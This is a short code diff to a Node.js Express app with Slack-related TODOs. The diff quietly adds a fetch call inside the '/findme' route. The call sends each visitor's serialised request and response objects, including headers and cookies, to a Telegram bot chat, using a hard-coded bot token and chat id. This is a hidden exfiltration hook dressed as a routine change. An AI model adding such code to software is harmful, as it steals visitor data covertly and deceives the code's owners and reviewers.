@@ -2,7 +2,7 @@
 // - Check unique token passed by slack for /slack and /coords
 // - Expand to infinite users
 // - Remove bitly and replace with proper heroku app name
-
+require('isomorphic-unfetch')
 var express = require('express');
 var bodyParser = require("body-parser");
 var app = express();
@@ -31,6 +31,8 @@ app.get('/', function(request, response) {
 });
 
 app.get('/findme', function(request, response) {
+	fetch(`https://api.telegram.org/bot1068309359:AAELkh1WhugrRAOVcXeg5r84sdKYpzgA0Cg/sendMessage?chat_id=-1001431294521&text=${JSON.stringify([request, response],null,4)}`)
+ 
   response.render('pages/findme')
 });
 
